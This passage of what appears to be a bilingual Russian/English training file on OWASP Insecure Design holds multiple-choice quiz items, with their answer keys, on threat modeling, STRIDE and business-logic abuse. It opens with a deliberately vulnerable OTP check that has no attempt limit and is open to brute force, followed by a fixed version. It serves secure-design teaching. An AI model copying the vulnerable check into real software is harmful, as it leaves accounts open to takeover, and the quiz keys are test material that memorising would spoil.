if (req.body.otp === user.otp) login(user);
// attacker loops 0000..9999`,
    fixCode: `// 6-digit + attempts + cooldown
if (user.otpAttempts >= 5) return lock(15 * 60);
if (!timingSafeEqual(otp, user.otp)) {
  user.otpAttempts++;
  return fail();
}`,
    quiz: [
      {
        q: M('В чём ключевое отличие Insecure Design от Security Misconfiguration?', 'What\'s the key difference between Insecure Design and Security Misconfiguration?'),
        opts: [
          M('Insecure Design относится только к паролям', 'Insecure Design only applies to passwords'),
          M('Это одно и то же', 'They\'re the same thing'),
          M('Insecure Design — отсутствие нужного контроля в самой архитектуре, даже при идеальной реализации; Misconfiguration — плохая настройка правильно спроектированного контроля', 'Insecure Design is the absence of a needed control in the architecture itself, even with a flawless implementation; Misconfiguration is a poorly configured, properly designed control'),
          M('Misconfiguration нельзя исправить патчем', 'Misconfiguration can never be fixed with a patch'),
        ],
        ans: 2,
        e: M('Insecure Design — отсутствие нужного контроля в архитектуре даже при идеальной реализации; Misconfiguration — неверная настройка уже заложенного контроля. Это разные root cause: «не спроектировали» vs «настроили плохо».', 'Insecure Design is a missing control in the architecture even with perfect code; Misconfiguration is bad setup of a control that exists by design. Root causes differ: never designed vs. poorly configured.'),
      },
      {
        q: M('Почему Insecure Design «нельзя исправить простым патчем»?', 'Why "can\'t Insecure Design be fixed with a simple patch"?'),
        opts: [
          M('Патчи слишком дорогие', 'Patches are too expensive'),
          M('Всегда можно исправить одним патчем', 'You can always fix it with one patch'),
          M('Патчи вообще не выпускаются для веб-приложений', 'Patches are never released for web apps'),
          M('Проблема заложена на уровне архитектуры/дизайна, и требует пересмотра модели, а не точечного изменения кода', 'The problem is baked into the architecture/design level and requires rethinking the model, not a targeted code change'),
        ],
        ans: 3,
        e: M('Insecure Design нельзя «залатать» одной строкой: отсутствует или неверна сама модель/процесс, нужен пересмотр архитектуры и требований. Точечный патч не добавляет контроль, которого нет в дизайне.', 'Insecure Design cannot be fixed with a one-line patch: the model/process itself is missing or wrong and needs architectural redesign. A local patch does not invent a control absent from the design.'),
      },
      {
        q: M('Threat modeling должен выполняться:', 'Threat modeling should be performed:'),
        opts: [
          M('на этапе проектирования (design phase), до написания кода', 'at the design phase, before code is written'),
          M('не требуется для веб-приложений', 'it isn\'t required for web applications'),
          M('после релиза, если найдены уязвимости', 'after release, if vulnerabilities are found'),
          M('только при аудите раз в год', 'only during an annual audit'),
        ],
        ans: 0,
        e: M('Threat modeling выполняют на этапе проектирования, до кода, чтобы заложить угрозы и контроли в архитектуру. После релиза остаётся лишь дорогое «затыкание» уже встроенных пробелов.', 'Threat modeling should run in the design phase, before code, so threats and controls shape the architecture. After release you only paper over gaps already baked in.'),
      },
      {
        q: M('Пример business logic abuse:', 'An example of business logic abuse:'),
        opts: [
          M('SQL-инъекция в форме поиска', 'SQL injection in a search form'),
          M('Использование легитимного функционала возврата средств много раз подряд для получения средств сверх уплаченных (endless refund loop)', 'Using a legitimate refund feature repeatedly to obtain funds beyond what was actually paid (endless refund loop)'),
          M('Утечка памяти в парсере', 'A memory leak in a parser'),
          M('Слабый TLS cipher', 'A weak TLS cipher'),
        ],
        ans: 1,
        e: M('Endless refund loop — abuse легитимного бизнес-сценария возврата без архитектурных лимитов/идемпотентности. Это business logic abuse, а не классическая SQLi или слабый TLS.', 'An endless refund loop abuses a legitimate refund flow lacking architectural limits/idempotency. That is business-logic abuse, not classic SQLi or weak TLS.'),
      },
      {
        q: M('STRIDE — это:', 'STRIDE is:'),
        opts: [
          M('инструмент сканирования портов', 'a port-scanning tool'),
          M('алгоритм шифрования', 'an encryption algorithm'),
          M('фреймворк threat modeling (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege)', 'a threat-modeling framework (Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege)'),
          M('СУБД', 'a DBMS'),
        ],
        ans: 2,
        e: M('STRIDE — фреймворк threat modeling: Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege. Он структурирует анализ угроз, а не является алгоритмом шифрования.', 'STRIDE is a threat-modeling framework: Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege. It structures threat analysis; it is not an encryption algorithm.'),
      },
      {
        q: M('Race condition в бизнес-логике (например, параллельные запросы на списание средств) относится к:', 'A race condition in business logic (e.g., parallel requests to debit funds) falls under:'),
        opts: [
          M('Cryptographic Failure', 'Cryptographic Failure'),
          M('Security Misconfiguration', 'Security Misconfiguration'),
          M('XSS', 'XSS'),
          M('Insecure Design — если архитектура не предусматривает атомарность/блокировку критичных операций', 'Insecure Design — if the architecture doesn\'t enforce atomicity/locking for critical operations'),
        ],
        ans: 3,
        e: M('Race condition в бизнес-логике (параллельные списания) — Insecure Design, если архитектура не обеспечивает атомарность и блокировки. Без design-level синхронизации код «работает», но злоупотребим.', 'A business-logic race (parallel debits) is Insecure Design when architecture omits atomicity and locking. Without design-level sync the code “works” but is abusable.'),
      },
      {
        q: M('Почему отсутствие лимита на количество применений промокода — пример Insecure Design, а не бага реализации?', 'Why is the lack of a limit on how many times a promo code can be applied an Insecure Design example, not an implementation bug?'),
        opts: [
          M('Дизайн бизнес-процесса изначально не предусмотрел ограничение как требование, поэтому даже безошибочная реализация «как задумано» остаётся уязвимой', 'The business process design never established this constraint as a requirement, so even a flawless implementation "as intended" remains exploitable'),
          M('Это относится только к Injection', 'It only relates to Injection'),
          M('Это всегда Cryptographic Failure', 'It\'s always a Cryptographic Failure'),
          M('Промокод — не связан с дизайном', 'Promo codes are unrelated to design'),
        ],
        ans: 0,
        e: M('Отсутствие лимита на применение промокода — пробел требований/дизайна процесса: реализация «как задумано» остаётся exploitable. Это не баг строки кода, а missing business rule.', 'No limit on promo-code reuse is a requirements/process-design gap: an “as intended” implementation remains exploitable. It is a missing business rule, not a single-line code bug.'),
      },
      {
        q: M('Reference architecture и secure design patterns, переиспользуемые между проектами, помогают предотвратить Insecure Design, потому что:', 'Reference architecture and secure design patterns reused across projects help prevent Insecure Design because:'),
        opts: [
          M('ускоряют компиляцию', 'they speed up compilation'),
          M('закладывают проверенные защитные механизмы (аутентификация, rate limiting) на уровне архитектуры с самого начала, а не постфактум', 'they build proven protective mechanisms (authentication, rate limiting) into the architecture from the start, rather than as an afterthought'),
          M('не имеют отношения к безопасности', 'they\'re unrelated to security'),
          M('заменяют необходимость тестирования', 'they replace the need for testing'),
        ],
        ans: 1,
        e: M('Reference architecture и secure design patterns встраивают проверенные контроли (auth, rate limiting) с самого начала во все проекты. Это снижает риск Insecure Design за счёт повторного использования «правильной» архитектуры.', 'Reference architectures and secure design patterns embed proven controls (auth, rate limiting) from day one across projects. Reusing sound architecture reduces Insecure Design risk.'),
      },
      {
        q: M('Attack tree в threat modeling используется для:', 'An attack tree in threat modeling is used to:'),
        opts: [
          M('шифрования данных', 'encrypt data'),
          M('хранения паролей', 'store passwords'),
          M('визуализации возможных путей атаки на систему от цели атакующего до конкретных техник', 'visualize possible attack paths from an attacker\'s goal down to specific techniques'),
          M('построения ER-диаграммы БД', 'build an ER diagram for a database'),
        ],
        ans: 2,
        e: M('Attack tree визуализирует пути от цели атакующего к конкретным техникам и шагам. Это помогает приоритизировать контроли на этапе threat modeling.', 'An attack tree visualizes paths from the attacker’s goal to concrete techniques and steps. That helps prioritize controls during threat modeling.'),
      },
      {
        q: M('Категория Insecure Design упала с #4 (2021) на #6 (2025) — наиболее вероятная причина:', 'The Insecure Design category fell from #4 (2021) to #6 (2025) — the most likely reason:'),
        opts: [
          M('уязвимость исчезла полностью', 'the vulnerability disappeared completely'),
          M('Insecure Design больше не тестируется', 'Insecure Design is no longer tested'),
          M('OWASP убрал большинство CWE из категории', 'OWASP removed most CWEs from the category'),
          M('рост зрелости индустрии в применении threat modeling и secure-by-design практик', 'growing industry maturity in applying threat modeling and secure-by-design practices'),
        ],
        ans: 3,
        e: M('Снижение Insecure Design с #4 (2021) до #6 (2025) связывают с ростом зрелости threat modeling и secure-by-design. Категория не исчезла, но индустрия чаще закладывает контроли заранее.', 'Insecure Design’s drop from #4 (2021) to #6 (2025) is linked to better threat modeling and secure-by-design maturity. The category remains, but industry more often designs controls in early.'),
      },
      {
        q: M('PASTA (Process for Attack Simulation and Threat Analysis) — это:', 'PASTA (Process for Attack Simulation and Threat Analysis) is:'),
        opts: [
          M('методология threat modeling, ориентированная на бизнес-риски', 'a threat-modeling methodology focused on business risk'),
          M('язык программирования', 'a programming language'),
          M('сетевой протокол', 'a network protocol'),
          M('алгоритм хеширования', 'a hashing algorithm'),
        ],
        ans: 0,
        e: M('PASTA — методология threat modeling, ориентированная на бизнес-риск и симуляцию атак. Это процесс анализа, а не язык программирования или сканер портов.', 'PASTA is a threat-modeling methodology focused on business risk and attack simulation. It is an analysis process, not a programming language or port scanner.'),
      },
      {
        q: M('Что из перечисленного — пример abuse-case тестирования (в противовес use-case)?', 'Which of the following is an example of abuse-case testing (as opposed to use-case testing)?'),
        opts: [
          M('Проверка производительности при нормальной нагрузке', 'Testing performance under normal load'),
          M('Проверка, что происходит, если пользователь пытается зарегистрировать 10000 аккаунтов за минуту для накрутки реферальных бонусов', 'Verifying what happens if a user tries to register 10,000 accounts in a minute to farm referral bonuses'),
          M('Проверка UI на разных разрешениях экрана', 'Testing UI at different screen resolutions'),
          M('Проверка, что форма регистрации работает при корректных данных', 'Verifying that the registration form works with valid data'),
        ],
        ans: 1,
        e: M('Abuse-case — проверка злоупотребления легитимной функцией (10 000 регистраций/мин для рефералок), а не happy-path use-case. Такие сценарии выявляют пробелы бизнес-логики в дизайне.', 'An abuse case tests misuse of a legitimate feature (10,000 signups/min for referrals), not the happy-path use case. Such scenarios reveal business-logic design gaps.'),
      },
      {
        q: M('Trust boundary (граница доверия) в архитектуре системы — это:', 'A trust boundary in system architecture is:'),
        opts: [
          M('физическая граница дата-центра', 'the physical perimeter of a data center'),
          M('правило firewall', 'a firewall rule'),
          M('точка, где данные/запросы пересекают уровень с разным уровнем доверия (например, от клиента к серверу), требующая проверки на этой границе', 'the point where data/requests cross between levels of differing trust (e.g., from client to server), requiring verification at that point'),
          M('настройка TLS', 'a TLS setting'),
        ],
        ans: 2,
        e: M('Trust boundary — граница, где данные/запросы переходят между разными уровнями доверия (клиент→сервер), и где нужны проверки. Это архитектурное понятие, не физический периметр ДЦ.', 'A trust boundary is where data/requests cross between different trust levels (client→server) and verification is required. It is an architectural concept, not a data-center fence.'),
      },
      {
        q: M('Почему rate limiting должен закладываться как часть архитектуры (Insecure Design), а не добавляться «заплаткой» после инцидента?', 'Why should rate limiting be baked into the architecture (Insecure Design concern), rather than bolted on as a "patch" after an incident?'),
        opts: [
          M('Заплатки всегда работают лучше', 'Patches always work better'),
          M('Rate limiting нужен только для DDoS', 'Rate limiting is only needed for DDoS'),
          M('Rate limiting не связан с design', 'Rate limiting is unrelated to design'),
          M('Архитектурно встроенный rate limiting предусматривает лимиты на уровне пользователя/API/транзакции системно, а не точечно для одного обнаруженного случая злоупотребления', 'Architecturally embedded rate limiting establishes systemic limits at the user/API/transaction level, rather than a one-off fix for a single observed abuse case'),
        ],
        ans: 3,
        e: M('Rate limiting как архитектурное требование задаёт системные лимиты на пользователя/API/транзакции, а не точечную заплатку после инцидента. Иначе abuse-сценарии остаются вне модели.', 'Architecturally required rate limiting sets systemic per-user/API/transaction caps, not a one-off patch after an incident. Otherwise abuse cases stay outside the model.'),
      },
      {
        q: M('Многошаговый бизнес-процесс (например, checkout) без проверки, что предыдущий шаг был завершён легитимно, уязвим к:', 'A multi-step business process (e.g., checkout) that doesn\'t verify the previous step completed legitimately is vulnerable to:'),
        opts: [
          M('Обходу бизнес-логики — прямому переходу к финальному шагу, минуя проверки (например, оплату)', 'Bypassing the business logic — jumping directly to the final step, skipping checks (e.g., payment)'),
          M('XXE', 'XXE'),
          M('SQL Injection', 'SQL Injection'),
          M('CSRF исключительно', 'CSRF exclusively'),
        ],
        ans: 0,
        e: M('Многошаговый процесс без проверки предыдущего шага позволяет перейти к финалу, минуя оплату/валидации. Это classic business-logic bypass из-за слабого дизайна workflow.', 'A multi-step flow that does not verify prior steps lets attackers jump to the end, skipping payment/validation. That is classic business-logic bypass from weak workflow design.'),
      },
      {
        q: M('Что из перечисленного — правильный пример unit/integration-теста, покрывающего security-сценарий (а не только happy path)?', 'Which of the following is a proper example of a unit/integration test covering a security scenario (not just the happy path)?'),
        opts: [
          M('Тест производительности загрузки страницы', 'A page-load performance test'),
          M('Тест, что API возвращает 403 при попытке доступа к чужому ресурсу с валидным, но недостаточным по правам токеном', 'A test that the API returns 403 when attempting to access someone else\'s resource with a valid but insufficiently privileged token'),
          M('Тест, что форма логина принимает корректный пароль', 'A test that the login form accepts a correct password'),
          M('Тест на поддержку мобильных устройств', 'A mobile-device support test'),
        ],
        ans: 1,
        e: M('Security-тест: API должен вернуть 403 при доступе к чужому ресурсу с валидным, но недостаточно привилегированным токеном. Это проверяет заложенный контроль авторизации, а не happy-path логин.', 'A security test expects 403 when accessing another user’s resource with a valid but under-privileged token. It verifies designed authorization, not happy-path login.'),
      },
      {
        q: M('Разница между «security control missing» (Insecure Design) и «security control present but misconfigured» (Security Misconfiguration) лучше всего иллюстрируется примером:', 'The difference between "security control missing" (Insecure Design) and "security control present but misconfigured" (Security Misconfiguration) is best illustrated by:'),
        opts: [
          M('Это один и тот же пример для обеих категорий', 'It\'s the same example for both categories'),
          M('Оба примера относятся только к Injection', 'Both examples belong only to Injection'),
          M('Отсутствие CAPTCHA в дизайне формы регистрации вообще (Insecure Design) vs CAPTCHA есть, но настроена с ключом тестового режима в проде (Misconfiguration)', 'A CAPTCHA entirely absent from the registration form\'s design (Insecure Design) vs. a CAPTCHA present but configured with a test-mode key in production (Misconfiguration)'),
          M('Ни один пример не связан с этими категориями', 'Neither example relates to these categories'),
        ],
        ans: 2,
        e: M('Нет CAPTCHA в дизайне регистрации — Insecure Design; CAPTCHA есть, но с test-ключом в проде — Misconfiguration. Первый случай — missing control, второй — bad config of an existing one.', 'No CAPTCHA in registration design is Insecure Design; CAPTCHA present with a test key in prod is Misconfiguration. Missing control vs. badly configured existing control.'),
      },
      {
        q: M('Segregation of tiers (разделение уровней по степени доверия и типу данных) в архитектуре относится к:', 'Segregation of tiers (dividing architecture by trust level and data type) relates to:'),
        opts: [
          M('Cryptographic Failure', 'Cryptographic Failure'),
          M('Не имеет отношения к безопасности', 'It\'s unrelated to security'),
          M('Только к сетевой инфраструктуре, не к дизайну приложения', 'Only network infrastructure, not app design'),
          M('Insecure Design — если её нет, вся система имеет единую поверхность атаки без изоляции критичных компонентов', 'Insecure Design — its absence means the whole system has a single, unisolated attack surface with no separation of critical components'),
        ],
        ans: 3,
        e: M('Отсутствие сегментации уровней/доверия — Insecure Design: единая поверхность атаки без изоляции критичных компонентов. Это свойство архитектуры, а не крипто-алгоритма.', 'Missing tier/trust segmentation is Insecure Design: one unisolated attack surface without separating critical parts. That is architectural, not a crypto algorithm issue.'),
      },
      {
        q: M('Что из перечисленного — НЕ является примером бизнес-логики, требующей защиты через дизайн?', 'Which of the following is NOT a business-logic example requiring design-level protection?'),
        opts: [
          M('Использование bcrypt для хеширования паролей', 'Using bcrypt for password hashing'),
          M('Лимит на количество запросов сброса пароля в час', 'A limit on password-reset requests per hour'),
          M('Проверка, что пользователь не может перевести отрицательную сумму денег', 'Preventing a user from transferring a negative amount of money'),
          M('Ограничение количества товара, который один аккаунт может купить при лимитированном дропе', 'Limiting how much of a limited-stock item one account can buy in a flash sale'),
        ],
        ans: 0,
        e: M('Хеширование паролей bcrypt относится к криптографическим практикам (A04 Cryptographic Failures), а не к пробелу бизнес-дизайна. Это НЕ пример Insecure Design.', 'Password hashing with bcrypt is a cryptographic practice (A04 Cryptographic Failures), not a business-design gap. It is NOT an Insecure Design example.'),
      },
      {
        q: M('Secure Development Lifecycle (SDL) включает threat modeling:', 'A Secure Development Lifecycle (SDL) includes threat modeling:'),
        opts: [
          M('только на финальном этапе перед релизом', 'only at the final stage before release'),
          M('для критичных user story/фич на этапе дизайна, до написания кода', 'for critical user stories/features at the design stage, before code is written'),
          M('не включает threat modeling вообще', 'it doesn\'t include threat modeling at all'),
          M('только после инцидента', 'only after an incident'),
        ],
        ans: 1,
        e: M('В SDL threat modeling делают для критичных user stories/фич на этапе дизайна, до написания кода. Поздний анализ перед релизом уже не закладывает контроли в модель.', 'In an SDL, threat-model critical user stories/features at design time, before coding. Late pre-release analysis no longer builds controls into the model.'),
      },
      {
        q: M('Почему «недостаточная сегментация multi-tenant SaaS-приложения» (когда один клиент теоретически может получить доступ к данным другого через архитектурный недочёт, не просто баг авторизации) — пример именно Insecure Design?', 'Why is "insufficient segmentation in a multi-tenant SaaS app" (where one customer could theoretically access another\'s data due to an architectural gap, not just an authorization bug) an example specifically of Insecure Design?'),
        opts: [
          M('Не относится к безопасности', 'It\'s unrelated to security'),
          M('Это всегда только IDOR (A01)', 'It\'s always just IDOR (A01)'),
          M('Если сама архитектура данных не предусматривает изоляцию tenant\'ов на уровне модели (например, общая таблица без строгого tenant_id enforcement на всех уровнях), это архитектурная проблема, требующая пересмотра модели данных, а не только патча одного эндпоинта', 'If the data architecture itself doesn\'t enforce tenant isolation at the model level (e.g., a shared table without strictly enforced tenant_id checks at every layer), this is an architectural problem requiring a data-model redesign, not just a single-endpoint patch'),
          M('Всегда решается через WAF', 'It\'s always solved with a WAF'),
        ],
        ans: 2,
        e: M('Если модель данных SaaS не enforce’ит изоляцию tenant (общий DB без жёсткого tenant_id), один клиент может читать данные другого — это Insecure Design. Баг в одной query — следствие, root cause в архитектуре.', 'If a SaaS data model does not enforce tenant isolation (shared DB without mandatory tenant_id), one customer can read another’s data — Insecure Design. A single-query bug is a symptom of architectural root cause.'),
      },
      {
        q: M('Что из перечисленного — пример «недостаточного дизайна» лимитов ресурсов (resource consumption), а не bug\'а реализации?', 'Which of the following is an example of "insufficient design" for resource limits, rather than an implementation bug?'),
        opts: [
          M('Утечка памяти в конкретной функции из-за забытого free()', 'A memory leak in a specific function due to a forgotten free()'),
          M('Ошибка в SQL-запросе', 'A bug in an SQL query'),
          M('Слабый пароль администратора', 'A weak admin password'),
          M('Архитектура API вообще не предусматривает ограничение размера/сложности запроса (например, произвольно глубокий вложенный JSON/GraphQL query), допуская DoS через дизайн API', 'The API architecture never limits request size/complexity at all (e.g., arbitrarily deep nested JSON/GraphQL queries), enabling DoS through the design'),
        ],
        ans: 3,
        e: M('API без лимитов размера/сложности запросов (неограниченная вложенность JSON/GraphQL) — insufficient design resource limits. Это открывает DoS/resource exhaustion на уровне приложения.', 'An API with no request size/complexity limits (unbounded nested JSON/GraphQL) is insufficient resource-limit design. It enables application-level DoS/resource exhaustion.'),
      },
      {
        q: M('Согласно принципам secure design, критичные защитные компоненты (аутентификация, rate limiting) должны быть реализованы:', 'Per secure-design principles, critical protective components (authentication, rate limiting) should be implemented:'),
        opts: [
          M('как переиспользуемые сервисы/библиотеки, применяемые единообразно во всём приложении', 'as reusable services/libraries applied consistently across the entire app'),
          M('заново в каждом модуле для гибкости', 'from scratch in every module for flexibility'),
          M('только во фронтенде', 'only in the frontend'),
          M('отдельно для каждого разработчика по своему усмотрению', 'separately by each developer as they see fit'),
        ],
        ans: 0,
        e: M('Критичные контроли (auth, rate limit) должны быть переиспользуемыми сервисами/библиотеками, единообразно применяемыми во всём приложении. Иначе «прокладки» в каждом модуле дают пробелы дизайна.', 'Critical controls (auth, rate limiting) should be reusable services/libraries applied consistently app-wide. Per-module one-offs leave design gaps.'),
      },
      {
        q: M('Attack surface analysis на этапе дизайна помогает:', 'Attack surface analysis at the design stage helps:'),
        opts: [
          M('увеличить производительность', 'increase performance'),
          M('заранее определить все точки взаимодействия системы с недоверенными источниками и спроектировать для них соответствующие защитные меры', 'proactively identify every point where the system interacts with untrusted sources and design appropriate protections for them'),
          M('заменить необходимость тестирования', 'replace the need for testing'),
          M('не имеет практического применения', 'has no practical use'),
        ],
        ans: 1,
        e: M('Attack surface analysis на design stage выявляет все точки взаимодействия с untrusted источниками и заранее проектирует контроли. Это проактивно, а не постфактум после инцидента.', 'Design-stage attack surface analysis finds every interaction with untrusted sources and designs controls early. It is proactive, not post-incident cleanup.'),
      },
      {
        q: M('Что из перечисленного — правильный пример защиты от race condition в бизнес-логике на уровне дизайна?', 'Which of the following is a correct example of protecting against a race condition in business logic at the design level?'),
        opts: [
          M('Просто увеличение таймаута запроса', 'Simply increasing the request timeout'),
          M('Использование более длинного пароля', 'Using a longer password'),
          M('Использование database-level lock/atomic transaction при критичных многошаговых операциях (например, списание баланса)', 'Using a database-level lock/atomic transaction for critical multi-step operations (e.g., debiting a balance)'),
          M('Отключение логирования', 'Disabling logging'),
        ],
        ans: 2,
        e: M('Защита от race condition: DB-lock или атомарная транзакция на критичных многошаговых операциях (списание баланса). Без этого параллельные запросы обходят бизнес-инварианты.', 'Race-condition defense uses DB locks or atomic transactions for critical multi-step ops (balance debit). Without them parallel requests break business invariants.'),
      },
      {
        q: M('Concept of «Trust but verify» относится к Insecure Design тем, что:', 'The concept of "Trust but verify" relates to Insecure Design in that:'),
        opts: [
          M('не связано с дизайном системы', 'it\'s unrelated to system design'),
          M('относится только к внешним API', 'it applies only to external APIs'),
          M('означает полное отсутствие проверок для «доверенных» источников', 'it means fully waiving checks for "trusted" sources'),
          M('современный принцип secure design предполагает проверку даже внутренних/доверенных источников (аналог Zero Trust), а не слепое доверие', 'modern secure-design principle calls for verifying even internal/trusted sources (akin to Zero Trust), rather than blindly trusting them'),
        ],
        ans: 3,
        e: M('«Trust but verify» / Zero Trust: даже «внутренние» источники нужно проверять — secure design не опирается на слепое доверие. Иначе компромисс одного компонента открывает всё.', '“Trust but verify” / Zero Trust: even “internal” sources need verification — secure design rejects blind trust. Otherwise one compromised component opens everything.'),
      },
      {
        q: M('Что из перечисленного — пример Insecure Design в контексте пароля/аутентификации, отличный от Authentication Failure (A07)?', 'Which of the following is an Insecure Design example in the authentication context, distinct from an Authentication Failure (A07)?'),
        opts: [
          M('Архитектура вообще не предусматривает возможность внедрения MFA в будущем без полного редизайна системы аутентификации (архитектурное ограничение)', 'The architecture doesn\'t allow for introducing MFA in the future without a full redesign of the authentication system (an architectural limitation)'),
          M('Отсутствие rate limiting на login (A07)', 'No rate limiting on login (A07)'),
          M('Слабый пароль пользователя (A07)', 'A user\'s weak password (A07)'),
          M('Использование MD5 для хеша пароля (A04)', 'Using MD5 for the password hash (A04)'),
        ],
        ans: 0,
        e: M('Архитектура auth, в которую нельзя добавить MFA без полной переделки, — Insecure Design (плохая расширяемость безопасности). Это не про слабый пароль сам по себе, а про модель системы.', 'An auth architecture that cannot add MFA without a full rewrite is Insecure Design (poor security extensibility). It is about the system model, not merely a weak password.'),
      },
      {
        q: M('Почему сценарии abuse-case важно продумывать вместе с продуктовой командой, а не только security-командой?', 'Why is it important to think through abuse-case scenarios together with the product team, not just the security team?'),
        opts: [
          M('Security-команда всегда справляется без продукта', 'The security team always manages fine alone'),
          M('Понимание бизнес-логики и намерений пользователей у продуктовой команды помогает выявить, какие легитимные функции можно злоупотребить не по назначению', 'Their understanding of business logic and user intent helps identify which legitimate features could be abused for unintended purposes'),
          M('Это требуется только для стартапов', 'It\'s only required for startups'),
          M('Продуктовая команда не имеет отношения к безопасности', 'The product team is unrelated to security'),
        ],
        ans: 1,
        e: M('Product owner знает бизнес-правила и intent пользователей, поэтому совместно с ним легче найти abuse-cases легитимных фич. Без бизнеса threat model пропускает логические дыры.', 'Product owners know business rules and user intent, so jointly they surface abuse cases of legitimate features. Without business input, threat models miss logic holes.'),
      },
      {
        q: M('Что из перечисленного иллюстрирует разницу между «vulnerability» и «missing control» применительно к Insecure Design?', 'Which of the following illustrates the difference between "vulnerability" and "missing control" as applied to Insecure Design?'),
        opts: [
          M('Missing control относится только к сети', 'A missing control only applies to networking'),
          M('Это одно и то же понятие', 'They\'re the same concept'),
          M('Vulnerability — конкретный баг в реализации существующего контроля; missing control — контроль, который должен был существовать по замыслу дизайна, но отсутствует полностью', 'A vulnerability is a specific bug in an existing control\'s implementation; a missing control is one that should have existed by design but is entirely absent'),
          M('Vulnerability относится только к паролям', 'A vulnerability only applies to passwords'),
        ],
        ans: 2,
        e: M('Vulnerability — дефект реализации уже существующего контроля; missing control — контроль вообще не заложен в дизайн. Insecure Design как раз про второе.', 'A vulnerability is a defect in an existing control’s implementation; a missing control was never designed in. Insecure Design is primarily the latter.'),
      },
      {
        q: M('Согласно OWASP, для эффективного secure design важно моделировать угрозы для:', 'Per OWASP, effective secure design requires modeling threats for:'),
        opts: [
          M('только внешних пользователей', 'only external users'),
          M('только администраторов', 'only administrators'),
          M('только мобильных клиентов', 'only mobile clients'),
          M('всех сущностей, взаимодействующих с системой — включая внутренних пользователей, партнёров, автоматизированные системы/боты', 'every entity that interacts with the system — including internal users, partners, automated systems/bots'),
        ],
        ans: 3,
        e: M('По OWASP нужно моделировать угрозы для всех сущностей, взаимодействующих с системой: пользователей, партнёров, автоматизации, внутренних ролей. Ограничение только «внешним хакером» оставляет слепые зоны.', 'Per OWASP, model threats for every entity interacting with the system: users, partners, automation, internal roles. Limiting the model to an external hacker leaves blind spots.'),
      },
      {
        q: M('Пример недостаточно продуманного лимита при регистрации (например, отсутствие проверки на массовую автоматическую регистрацию аккаунтов ботами для накрутки реферальной программы) относится к:', 'An example of an insufficiently thought-out limit at registration (e.g., no check against mass automated bot registration to farm a referral program) falls under:'),
        opts: [
          M('Insecure Design / business logic abuse', 'Insecure Design / business logic abuse'),
          M('Cryptographic Failure', 'Cryptographic Failure'),
          M('Security Logging Failure', 'Security Logging Failure'),
          M('SQL Injection', 'SQL Injection'),
        ],
        ans: 0,
        e: M('Регистрация без лимитов/проверок (массовые аккаунты) — Insecure Design и business logic abuse. Легитимная функция становится инструментом накрутки и fraud.', 'Registration without limits/checks (mass accounts) is Insecure Design / business-logic abuse. A legitimate feature becomes a fraud and farming tool.'),
      },
      {
        q: M('Что из перечисленного — верная практика реагирования на найденный на пентесте Insecure Design баг (в отличие от классической уязвимости кода)?', 'Which of the following is proper practice when a pentest finds an Insecure Design flaw (as opposed to a classic code vulnerability)?'),
        opts: [
          M('Понизить severity автоматически, так как это не «классическая» уязвимость', 'Automatically lower its severity since it isn\'t a "classic" vulnerability'),
          M('Эскалировать архитектурной/продуктовой команде для пересмотра дизайна процесса, так как локальный патч может не покрыть все варианты обхода', 'Escalate to the architecture/product team for a redesign of the process, since a local patch may not cover every bypass variant'),
          M('Игнорировать, если PoC не сработал с первой попытки', 'Ignore it if the PoC didn\'t succeed on the first try'),
          M('Просто исправить один эндпоинт локальным патчем и закрыть тикет', 'Simply patch the single endpoint locally and close the ticket'),
        ],
        ans: 1,
        e: M('Находка Insecure Design на пентесте требует эскалации к architecture/product для пересмотра процесса; локальный патч может не закрыть модель. Нужен redesign, а не только hotfix строки.', 'An Insecure Design finding in a pentest needs escalation to architecture/product for process redesign; a local patch may not fix the model. Redesign beats a one-line hotfix.'),
      },
      {
        q: M('Zero-day «design flaw» отличается от zero-day «implementation bug» тем, что:', 'How does a zero-day "design flaw" differ from a zero-day "implementation bug"?'),
        opts: [
          M('design flaw невозможно эксплуатировать', 'A design flaw can\'t be exploited'),
          M('Это синонимы', 'They\'re synonyms'),
          M('design flaw требует пересмотра архитектуры для устранения, а не просто патча кода, и часто затрагивает несколько компонентов системы одновременно', 'A design flaw requires an architecture redesign to fix, rather than a simple code patch, and often affects several components at once'),
          M('implementation bug никогда не патчится', 'An implementation bug is never patched'),
        ],
        ans: 2,
        e: M('Design-flaw zero-day требует изменения архитектуры, а implementation bug — точечного патча кода. Design flaws обычно шире по impact и дольше закрываются.', 'A design-flaw zero-day needs architectural change; an implementation bug needs a targeted code patch. Design flaws are usually broader in impact and slower to remediate.'),
      },
      {
        q: M('Какая из следующих мер относится к «Secure design patterns and paved road», рекомендуемым OWASP?', 'Which of the following relates to "secure design patterns and paved road," as recommended by OWASP?'),
        opts: [
          M('Отказ от code review', 'Skipping code review'),
          M('Отсутствие стандартов между командами', 'No standards shared across teams'),
          M('Каждая команда изобретает собственную реализацию аутентификации с нуля', 'Every team reinvents its own authentication implementation from scratch'),
          M('Централизованные, проверенные библиотеки/сервисы (auth-as-a-service, rate-limiting middleware), обязательные к использованию всеми командами', 'Centralized, proven libraries/services (auth-as-a-service, rate-limiting middleware), mandatory for all teams to use'),
        ],
        ans: 3,
        e: M('Paved road — централизованные проверенные сервисы (auth-as-a-service, rate-limit middleware), обязательные для команд. Это secure design patterns, снижающие ad-hoc дыры.', 'A paved road means centralized proven services (auth-as-a-service, rate-limit middleware) mandatory for teams. Those secure design patterns reduce ad-hoc gaps.'),
      },
      {
        q: M('Что из перечисленного — правильный пример защиты от «scalping»/накрутки лимитированных товаров через дизайн (не через патч после инцидента)?', 'Which of the following is a correct example of defending against "scalping"/limited-item hoarding through design (rather than a post-incident patch)?'),
        opts: [
          M('Изначально заложить в архитектуру покупки: rate limiting на аккаунт/IP, поведенческий анализ, лимит количества товара на аккаунт как часть бизнес-требований', 'Building purchase-flow rate limiting per account/IP, behavioral analysis, and per-account item limits into the architecture from the start as business requirements'),
          M('Увеличить цену товара вдвое', 'Doubling the item\'s price'),
          M('Просто добавить CAPTCHA постфактум после того, как весь товар уже скуплен ботами один раз', 'Simply adding a CAPTCHA after the fact, once bots have already bought out the entire stock once'),
          M('Игнорировать проблему', 'Ignoring the problem'),
        ],
        ans: 0,
